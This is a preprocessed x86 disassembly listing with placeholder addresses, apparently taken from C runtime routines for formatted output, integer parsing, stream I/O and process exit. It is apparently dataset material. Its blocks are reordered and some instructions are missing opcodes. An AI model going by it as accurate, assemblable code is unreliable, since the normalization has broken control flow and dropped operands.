neg [ ecx + 0x24 ]
sub_414847
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xb
ja r-xdata
xor eax eax
pop ebp
retn
jmp [ eax * 4 + jump_table_414873 ]
push 0x4
xor eax eax
inc eax
pop ebp
retn
push 0x2
jmp r-xdata
push 0x8
jmp r-xdata
pop eax
pop ebp
retn
sub_4148a3
mov edi edi
push ebx
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ eax - 0x4 ]
test edi edi
je r-xdata
mov [ esi + 0x34 ] r--data
mov [ esi + 0x38 ] 0x6
mov ebx [ edi + 0x4 ]
test ebx ebx
je r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x31 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_413e09
add esp 0x10
mov [ esi + 0x34 ] ebx
test al al
movzx eax [ edi ]
je r-xdata
mov [ esi + 0x38 ] eax
jmp r-xdata
shr eax 0x1
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] 0x1
jmp r-xdata
mov [ esi + 0x3c ] 0x0
pop edi
pop esi
mov al 0x1
pop ebx
retn
sub_414906
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
or [ esi + 0x20 ] 0x10
mov eax [ esi + 0x28 ]
test eax eax
jns r-xdata
jne r-xdata
mov al [ esi + 0x31 ]
cmp al 0x61
je r-xdata
mov eax [ esi + 0x28 ]
lea edi [ esi + 0x40 ]
push ebx
mov ebx 0x15d
mov ecx edi
add eax ebx
push eax
call sub_413d83
test al al
jne r-xdata
mov al [ esi + 0x31 ]
cmp al 0x67
je r-xdata
mov [ esi + 0x28 ] 0xd
jmp r-xdata
cmp al 0x41
je r-xdata
mov eax [ edi + 0x404 ]
test eax eax
jne r-xdata
mov ecx edi
call sub_413d6b
sub eax ebx
mov [ esi + 0x28 ] eax
mov [ esi + 0x28 ] 0x1
cmp al 0x47
jne r-xdata
mov [ esi + 0x28 ] 0x6
jmp r-xdata
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x34 ] eax
add [ esi + 0x14 ] 0x8
mov ecx [ esi + 0x14 ]
mov eax [ ecx - 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ecx - 0x4 ]
mov ecx edi
mov [ ebp - 0x4 ] eax
call sub_413d6b
mov ebx [ edi + 0x404 ]
mov ecx eax
test ebx ebx
jne r-xdata
mov eax edi
push [ esi + 0x8 ]
movsx eax [ esi + 0x31 ]
push [ esi + 0x4 ]
push [ esi ]
push [ esi + 0x28 ]
push eax
push ecx
mov ecx edi
call sub_413e49
push eax
mov ecx edi
call sub_413d6b
push eax
lea eax [ ebp - 0x8 ]
push ebx
push eax
call sub_41b785
mov eax [ esi + 0x20 ]
add esp 0x28
shr eax 0x5
pop ebx
test al 0x1
je r-xdata
mov ebx edi
mov al [ esi + 0x31 ]
cmp al 0x67
je r-xdata
cmp [ esi + 0x28 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x5
test al 0x1
jne r-xdata
cmp al 0x47
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_414195
pop ecx
pop ecx
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x2d
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_414109
pop ecx
pop ecx
mov edx [ esi + 0x34 ]
mov al [ edx ]
cmp al 0x69
je r-xdata
or [ esi + 0x20 ] 0x40
inc eax
mov [ esi + 0x34 ] eax
mov [ esi + 0x31 ] 0x73
cmp al 0x49
je r-xdata
mov cl [ edx ]
inc edx
test cl cl
jne r-xdata
sub edx edi
mov al 0x1
pop edi
mov [ esi + 0x38 ] edx
pop esi
mov esp ebp
pop ebp
retn
cmp al 0x6e
je r-xdata
cmp al 0x4e
jne r-xdata
lea edi [ edx + 0x1 ]
sub_414a60
mov edi edi
push esi
mov esi ecx
push edi
push [ esi + 0x2c ]
movzx eax [ esi + 0x31 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_413e09
add esp 0x10
lea edi [ esi + 0x40 ]
test al al
je r-xdata
mov ecx [ edi + 0x404 ]
test ecx ecx
jne r-xdata
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
push ebx
mov ebx [ edi + 0x404 ]
movzx eax [ eax - 0x4 ]
test ebx ebx
jne r-xdata
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov al [ eax - 0x4 ]
mov [ ecx ] al
mov [ esi + 0x38 ] 0x1
mov ecx edi
push eax
mov ecx edi
call sub_413d6b
push eax
lea eax [ esi + 0x38 ]
push ebx
push eax
call sub_41ae43
add esp 0x10
pop ebx
test eax eax
je r-xdata
mov ebx edi
mov [ esi + 0x34 ] edi
mov al 0x1
pop edi
pop esi
retn 0x4
mov edi eax
mov eax [ edi + 0x404 ]
test eax eax
je r-xdata
mov [ esi + 0x30 ] 0x1
jmp r-xdata
sub_414af0
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push [ esi + 0x2c ]
call sub_414847
pop ecx
mov ebx eax
mov ecx ebx
sub ecx 0x1
je r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
sub ecx 0x1
je r-xdata
movzx eax [ eax - 0x4 ]
movsx eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
dec ecx
sub ecx 0x1
je r-xdata
cmp [ esi + 0x28 ] 0x0
pop edi
jge r-xdata
test edx edx
jg r-xdata
cdq
mov ecx eax
movzx eax [ eax - 0x4 ]
jmp r-xdata
movsx eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
sub ecx 0x4
je r-xdata
and [ esi + 0x20 ] 0xfffffff7
mov eax 0x200
cmp [ esi + 0x28 ] eax
jle r-xdata
mov [ esi + 0x28 ] 0x1
jmp r-xdata
jl r-xdata
mov ecx [ eax - 0x4 ]
xor edx edx
jmp r-xdata
mov eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x8
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
mov ecx [ eax - 0x8 ]
mov edx [ eax - 0x4 ]
jmp r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
xor al al
jmp r-xdata
mov eax ecx
or eax edx
jne r-xdata
mov [ esi + 0x28 ] eax
neg ecx
adc edx 0x0
neg edx
or edi 0x40
mov [ esi + 0x20 ] edi
test ecx ecx
jae r-xdata
push edi
mov edi [ esi + 0x20 ]
mov eax edi
shr eax 0x4
test al 0x1
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp ebx 0x8
jne r-xdata
and [ esi + 0x20 ] 0xffffffdf
push ecx
mov ecx esi
call sub_413e67
push edx
push ecx
mov ecx esi
call sub_413edc
jmp r-xdata
mov al 0x1
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x7
test al 0x1
je r-xdata
dec [ esi + 0x34 ]
mov ecx [ esi + 0x34 ]
mov [ ecx ] 0x30
inc [ esi + 0x38 ]
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x30
je r-xdata
sub_414c3a
mov edi edi
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ eax - 0x4 ]
call sub_41b8f5
test eax eax
jne r-xdata
push [ esi + 0x2c ]
call sub_414847
pop ecx
sub eax 0x1
je r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
xor al al
jmp r-xdata
mov al [ esi + 0x18 ]
mov [ edi ] al
sub eax 0x1
je r-xdata
pop edi
pop esi
retn
mov ax [ esi + 0x18 ]
mov [ edi ] ax
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
mov [ esi + 0x30 ] 0x1
mov al 0x1
mov eax [ esi + 0x18 ]
mov [ edi ] eax
jmp r-xdata
sub eax 0x4
jne r-xdata
mov eax [ esi + 0x18 ]
cdq
mov [ edi ] eax
mov [ edi + 0x4 ] edx
jmp r-xdata
sub_414ce5
mov edi edi
push ebx
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ esi + 0x28 ]
mov ebx [ eax - 0x4 ]
mov [ esi + 0x34 ] ebx
cmp edi 0xffffffff
jne r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x31 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_413e09
add esp 0x10
test al al
je r-xdata
mov edi 0x7fffffff
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
push edi
push [ esi + 0x34 ]
call sub_41a443
mov [ esi + 0x34 ] r--data
push edi
push [ esi + 0x34 ]
mov [ esi + 0x3c ] 0x1
call sub_41a56a
jmp r-xdata
mov [ esi + 0x34 ] r--data
pop ecx
pop ecx
pop edi
mov [ esi + 0x38 ] eax
mov al 0x1
pop esi
pop ebx
retn
sub_414d7a
mov edi edi
push ebp
mov ebp esp
mov edx ecx
mov ecx [ edx ]
mov eax [ ecx + 0x8 ]
cmp eax [ ecx + 0x4 ]
mov eax [ ebp + 0xc ]
jne r-xdata
inc [ eax ]
mov eax [ edx ]
inc [ eax + 0x8 ]
mov eax [ edx ]
mov ecx [ eax ]
mov al [ ebp + 0x8 ]
mov [ ecx ] al
mov eax [ edx ]
inc [ eax ]
mov al 0x1
cmp [ ecx + 0xc ] 0x0
je r-xdata
or [ eax ] 0xffffffff
inc [ eax ]
jmp r-xdata
pop ebp
retn 0x8
mov eax [ edx ]
mov al [ eax + 0xc ]
jmp r-xdata
sub_414dbc
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi ecx
push edi
cmp [ esi + 0x3c ] 0x0
je r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push [ esi + 0x38 ]
lea ecx [ esi + 0x448 ]
push [ esi + 0x34 ]
call sub_414e63
mov eax [ esi + 0x38 ]
test eax eax
jle r-xdata
mov edi [ esi + 0x34 ]
xor ebx ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov al 0x1
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40d56a
mov esp ebp
pop ebp
retn 0x4
movzx eax [ edi ]
lea edi [ edi + 0x2 ]
and [ ebp - 0x10 ] 0x0
push eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_41ae43
add esp 0x10
test eax eax
jne r-xdata
or [ esi + 0x18 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x10 ] eax
je r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
push eax
lea ecx [ esi + 0x448 ]
call sub_414e63
inc ebx
cmp ebx [ esi + 0x38 ]
jne r-xdata
jmp r-xdata
sub_414e63
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov eax ecx
mov [ ebp - 0x8 ] eax
mov ecx [ edi ]
and [ edi ] 0x0
mov eax [ eax ]
mov [ ebp - 0x4 ] ecx
mov esi [ eax + 0x4 ]
cmp [ eax + 0x8 ] esi
jne r-xdata
sub esi [ eax + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
cmp esi ebx
jb r-xdata
cmp [ eax + 0xc ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
push [ eax ]
call sub_4117a0
mov ecx [ ebp - 0x8 ]
add esp 0xc
mov eax [ ecx ]
add [ eax ] esi
mov eax [ ecx ]
add [ eax + 0x8 ] esi
mov eax [ ecx ]
cmp [ eax + 0xc ] 0x0
mov eax [ ebp + 0x10 ]
je r-xdata
mov esi ebx
mov eax [ ebp + 0x10 ]
or [ eax ] 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
add [ ecx ] eax
jmp r-xdata
cmp esi ebx
je r-xdata
add [ eax ] ebx
jmp r-xdata
cmp [ edi ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
add [ eax ] esi
or [ eax ] 0xffffffff
jmp r-xdata
pop ebx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x10
test ecx ecx
je r-xdata
mov [ edi ] ecx
sub_414ef6
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_413cf3
add esp 0x1c
pop ebp
retn
sub_414f1a
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
test edx edx
je r-xdata
call sub_41529e
push 0x16
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
push edi
mov edi edx
sub esi edx
mov [ edx ] 0x0
pop edi
test ecx ecx
jne r-xdata
sub ecx 0x1
jne r-xdata
xor esi esi
jmp r-xdata
mov [ edx ] cl
call sub_41529e
push 0x22
jmp r-xdata
mov al [ esi + edi ]
mov [ edi ] al
inc edi
test al al
je r-xdata
mov eax esi
pop esi
pop ebp
retn
pop esi
mov [ eax ] esi
call sub_413b01
sub_414f87
push 0xc
push r--data
call sub_429a90
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
push 0x2
call sub_4191c3
pop ecx
and [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
jne r-xdata
call sub_4150e1
test al al
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_415091
test esi esi
jne r-xdata
xor eax eax
inc eax
mov ecx rw-data
xchg [ ecx ] eax
mov [ ebp - 0x4 ] 0x1
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
push [ ebp + 0x8 ]
call sub_415125
pop ecx
call sub_429ad9
retn
push [ ebp + 0x8 ]
call sub_4150a0
cmp edi 0x1
jne r-xdata
mov ebx [ rw-data ]
mov edx ebx
and edx 0x1f
push 0x20
pop ecx
sub ecx edx
xor eax eax
ror eax cl
xor eax ebx
mov ecx [ rw-data ]
cmp ecx eax
je r-xdata
and [ ebp - 0x4 ] 0x0
test edi edi
jne r-xdata
push rw-data
push rw-data
jmp r-xdata
xor ebx ecx
xor eax eax
push eax
push eax
push eax
mov ecx edx
ror ebx cl
mov ecx ebx
call [ r--data ]
call ebx
push r--data
push r--data
call sub_417d37
pop ecx
pop ecx
test esi esi
jne r-xdata
push r--data
push r--data
call sub_417d37
pop ecx
pop ecx
call sub_417ae5
pop ecx
mov [ rw-data ] 0x1
sub_4150a0
mov edi edi
push ebp
mov ebp esp
call sub_41c3a9
test al al
je r-xdata
push [ ebp + 0x8 ]
call sub_415125
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
mov eax [ fs : 0x30 ]
mov eax [ eax + 0x68 ]
shr eax 0x8
test al 0x1
jne r-xdata
push [ ebp + 0x8 ]
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
sub_4150e1
push 0x0
call [ GetModuleHandleW@IAT ]
mov ecx eax
test ecx ecx
jne r-xdata
mov eax 0x5a4d
cmp [ ecx ] ax
jne r-xdata
xor al al
retn
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
jne r-xdata
cmp [ eax + 0x74 ] 0xe
jbe r-xdata
cmp [ eax + 0xe8 ] 0x0
setne al
retn
sub_415125
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push r--data
push 0x0
call [ GetModuleHandleExW@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push esi
push r--data
push [ ebp - 0x8 ]
call [ GetProcAddress@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40d56a
mov esp ebp
pop ebp
retn
push [ ebp - 0x8 ]
call [ FreeLibrary@IAT ]
pop esi
push [ ebp + 0x8 ]
mov ecx esi
call [ r--data ]
call esi
sub_4151d2
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
cmp [ rw-data ] eax
jne sub_4190e7
push [ ebp + 0x8 ]
call sub_417c8d
pop ecx
mov [ rw-data ] eax
pop ebp
retn
sub_415225
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
mov eax [ eax * 8 + r--data ]
pop ebp
retn
inc eax
cmp eax 0x2d
jb r-xdata
cmp ecx [ eax * 8 + r--data ]
je r-xdata
lea eax [ ecx - 0x13 ]
cmp eax 0x11
ja r-xdata
lea eax [ ecx - 0xbc ]
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_415268
mov edi edi
push ebp
mov ebp esp
push esi
call sub_41528b
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_415225
pop ecx
mov esi eax
call sub_41529e
mov [ eax ] esi
pop esi
pop ebp
retn
sub_4152b1
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
test edx edx
jne r-xdata
sub [ edx + 0x8 ] 0x1
jns r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
or eax 0xffffffff
pop ebp
retn
mov eax [ edx ]
mov cl [ eax ]
inc eax
mov [ edx ] eax
movzx eax cl
pop ebp
retn
push edx
call sub_41c5e7
pop ecx
pop ebp
retn
sub_4152ed
push 0x10
push r--data
call sub_40e2a0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x20 ] esi
xor eax eax
test esi esi
setne al
test eax eax
jne r-xdata
and [ ebp - 0x1c ] 0x0
push esi
call sub_416c9b
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ esi + 0xc ]
shr eax 0xc
test al 0x1
jne r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
push esi
call sub_4152b1
pop ecx
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4153e5
mov eax esi
push esi
call sub_41b8cf
pop ecx
mov edx eax
cmp edx 0xffffffff
je r-xdata
call sub_40e2e6
retn
mov ecx rw-data
mov eax ecx
cmp edx 0xfffffffe
je r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
push 0xfffffffe
lea ecx [ ebp - 0x10 ]
push ecx
push rw-data
call sub_4136a0
add esp 0xc
jmp r-xdata
cmp edx 0xffffffff
je r-xdata
mov ecx edx
sar ecx 0x6
and eax 0x3f
imul eax eax 0x30
add eax [ ecx * 4 + rw-data ]
mov ecx rw-data
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
test [ ecx + 0x2d ] 0x1
je r-xdata
cmp edx 0xfffffffe
je r-xdata
cmp [ eax + 0x29 ] 0x0
jne r-xdata
mov eax edx
sar eax 0x6
and edx 0x3f
imul ecx edx 0x30
add ecx [ eax * 4 + rw-data ]
sub_4153ef
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
sub [ edx + 0x8 ] 0x1
jns r-xdata
mov eax [ edx ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] cl
inc [ edx ]
movzx eax cl
pop ebp
retn
push edx
push [ ebp + 0x8 ]
call sub_41c7cf
pop ecx
pop ecx
pop ebp
retn
sub_415418
push 0xc
push r--data
call sub_40e2a0
xor eax eax
mov esi [ ebp + 0xc ]
test esi esi
setne al
test eax eax
jne r-xdata
and [ ebp - 0x1c ] 0x0
push esi
call sub_416c9b
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ esi + 0xc ]
shr eax 0xc
test al 0x1
jne r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
push esi
push [ ebp + 0x8 ]
call sub_4153ef
pop ecx
pop ecx
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_415514
mov eax edi
push esi
call sub_41b8cf
pop ecx
mov edx eax
cmp edx 0xffffffff
je r-xdata
call sub_40e2e6
retn
mov ecx rw-data
mov eax ecx
cmp edx 0xfffffffe
je r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
push 0xfffffffe
lea ecx [ ebp - 0x10 ]
push ecx
push rw-data
call sub_4136a0
add esp 0xc
jmp r-xdata
cmp edx 0xffffffff
je r-xdata
mov ecx edx
sar ecx 0x6
and eax 0x3f
imul eax eax 0x30
add eax [ ecx * 4 + rw-data ]
mov ecx rw-data
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
test [ ecx + 0x2d ] 0x1
je r-xdata
cmp edx 0xfffffffe
je r-xdata
cmp [ eax + 0x29 ] 0x0
jne r-xdata
mov eax edx
sar eax 0x6
and edx 0x3f
imul ecx edx 0x30
add ecx [ eax * 4 + rw-data ]
sub_41551c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
lea edx [ esi + 0xc ]
mov eax [ edx ]
shr eax 0xc
test al 0x1
jne r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0xffffffff
je r-xdata
push esi
call sub_41b8cf
mov edx eax
mov edi rw-data
pop ecx
cmp edx 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ edx ]
mov ecx [ edx ]
test al 0x1
jne r-xdata
mov eax edi
cmp edx 0xfffffffe
je r-xdata
pop ebx
cmp [ esi + 0x4 ] 0x0
jne r-xdata
and ecx 0x6
cmp cl 0x6
jne r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
or eax 0xffffffff
jmp r-xdata
cmp edx 0xffffffff
je r-xdata
and eax 0x3f
mov ecx edx
imul eax eax 0x30
sar ecx 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov eax [ esi ]
cmp eax [ esi + 0x4 ]
jne r-xdata
push esi
call sub_41c7da
pop ecx
lea edx [ esi + 0xc ]
pop edi
pop esi
pop ebp
retn
test [ edi + 0x2d ] 0x1
je r-xdata
cmp edx 0xfffffffe
je r-xdata
cmp [ eax + 0x29 ] 0x0
jne r-xdata
mov eax [ edx ]
shr eax 0xc
dec [ esi ]
test al 0x1
mov eax [ esi ]
je r-xdata
cmp [ esi + 0x8 ] 0x0
je r-xdata
lea edx [ esi + 0xc ]
mov eax edx
and edx 0x3f
imul edi edx 0x30
sar eax 0x6
add edi [ eax * 4 + rw-data ]
mov [ eax ] bl
cmp [ eax ] bl
je r-xdata
inc eax
mov [ esi ] eax
inc [ esi + 0x8 ]
push 0xfffffff7
pop eax
[ edx ] eax
xor eax eax
inc eax
[ edx ] eax
movzx eax bl
inc eax
mov [ esi ] eax
sub_41560b
push 0xc
push r--data
call sub_40e2a0
xor eax eax
mov esi [ ebp + 0xc ]
test esi esi
setne al
test eax eax
jne r-xdata
or [ ebp - 0x1c ] 0xffffffff
push esi
call sub_416c9b
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
push [ ebp + 0x8 ]
call sub_41551c
pop ecx
pop ecx
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_415673
mov eax edi
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
or eax 0xffffffff
jmp r-xdata
call sub_40e2e6
retn
sub_41567b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test al 0x4
je r-xdata
test al 0x1
je r-xdata
mov al 0x1
pop ebp
retn
xor al al
pop ebp
retn
and eax 0x2
je r-xdata
test eax eax
jne r-xdata
cmp [ ebp + 0xc ] 0x80000000
ja r-xdata
cmp [ ebp + 0xc ] 0x7fffffff
ja r-xdata
sub_4156ae
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
test ecx ecx
je r-xdata
pop ebp
retn
mov [ ecx ] edx
sub_4156c9
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
lea ecx [ ebp + 0xc ]
push ebx
push edi
call sub_41602a
test al al
je r-xdata
xor ebx ebx
mov edi [ ebp + 0x14 ]
test edi edi
je r-xdata
pop edi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0xc ]
mov [ edx ] ecx
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x28 ]
call sub_414048
mov eax [ ebp + 0xc ]
xor esi esi
mov [ ebp - 0xc ] esi
mov [ ebp - 0x18 ] eax
jmp r-xdata
cmp edi 0x2
jl r-xdata
mov bl [ eax ]
inc eax
mov [ ebp + 0xc ] eax
lea eax [ ebp - 0x24 ]
push eax
movzx eax bl
push 0x8
push eax
mov [ ebp - 0x4 ] bl
call sub_41606f
add esp 0xc
test eax eax
jne r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
cmp edi 0x24
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ ebp + 0x18 ] al
setne al
mov [ ebp - 0x8 ] eax
cmp bl 0x2d
jne r-xdata
cmp bl 0x2b
jne r-xdata
or eax 0x2
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov esi [ ebp + 0xc ]
mov esi [ ebp + 0xc ]
mov bl [ esi ]
inc esi
mov [ ebp - 0x4 ] bl
mov [ ebp + 0xc ] esi
jmp r-xdata
mov al bl
sub al 0x30
cmp al 0x9
ja r-xdata
cmp edi 0x10
jne r-xdata
test edi edi
je r-xdata
mov al bl
sub al 0x61
cmp al 0x19
ja r-xdata
movsx eax bl
add eax 0xffffffd0
jmp r-xdata
xor edx edx
or eax 0xffffffff
div edi
mov [ ebp - 0x14 ] edx
mov edx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov al bl
sub al 0x41
cmp al 0x19
ja r-xdata
movsx eax bl
add eax 0xffffffa9
jmp r-xdata
test eax eax
je r-xdata
mov al bl
sub al 0x61
cmp al 0x19
ja r-xdata
movsx ecx bl
add ecx 0xffffffd0
jmp r-xdata
or eax 0xffffffff
movsx eax bl
add eax 0xffffffc9
jmp r-xdata
mov al [ esi ]
inc esi
mov [ ebp - 0x10 ] al
mov [ ebp + 0xc ] esi
cmp al 0x78
je r-xdata
test edi edi
jne r-xdata
mov al bl
sub al 0x41
cmp al 0x19
ja r-xdata
movsx ecx bl
add ecx 0xffffffa9
jmp r-xdata
cmp ecx 0xffffffff
je r-xdata
test edi edi
jne r-xdata
cmp al 0x58
je r-xdata
push 0xa
pop edi
jmp r-xdata
or ecx 0xffffffff
movsx ecx bl
add ecx 0xffffffc9
jmp r-xdata
push [ ebp - 0x4 ]
lea ecx [ ebp + 0xc ]
mov [ ebp - 0x8 ] edx
call sub_415fd6
mov ebx [ ebp - 0x8 ]
test bl 0x8
jne r-xdata
cmp ecx edi
jae r-xdata
mov bl [ esi ]
inc esi
mov [ ebp - 0x4 ] bl
mov [ ebp + 0xc ] esi
push 0x10
pop edi
test edi edi
jne r-xdata
mov esi [ ebp - 0xc ]
push esi
push ebx
call sub_41567b
pop ecx
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x18 ]
xor ebx ebx
mov [ ebp + 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
or edx 0x8
mov ebx [ ebp - 0x10 ]
cmp eax ebx
jb r-xdata
push [ ebp - 0x10 ]
lea ecx [ ebp + 0xc ]
call sub_415fd6
mov esi [ ebp + 0xc ]
jmp r-xdata
push 0x8
pop edi
test bl 0x2
je r-xdata
call sub_41529e
mov [ eax ] 0x22
test bl 0x1
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
pop esi
je r-xdata
imul eax edi
add eax ecx
mov [ ebp - 0xc ] eax
jne r-xdata
mov ebx esi
neg esi
test bl 0x2
je r-xdata
or esi 0xffffffff
jmp r-xdata
mov edx [ ebp + 0x10 ]
test edx edx
je r-xdata
mov eax [ ebp - 0x28 ]
and [ eax + 0x350 ] 0xfffffffd
jmp r-xdata
lea ecx [ ebx - 0x30 ]
cmp cl 0x9
ja r-xdata
or edx 0x4
jmp r-xdata
cmp ecx [ ebp - 0x14 ]
jbe r-xdata
mov ebx 0x7fffffff
jmp r-xdata
mov ebx 0x80000000
jmp r-xdata
mov bl [ esi ]
inc esi
mov [ ebp - 0x4 ] bl
mov [ ebp + 0xc ] esi
jmp r-xdata
sub_4158f1
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
lea ecx [ ebp + 0xc ]
push ebx
push edi
call sub_41602a
test al al
je r-xdata
xor ebx ebx
mov eax [ ebp + 0x14 ]
push 0x2
pop edi
test eax eax
je r-xdata
pop edi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0xc ]
mov [ edx ] ecx
push esi
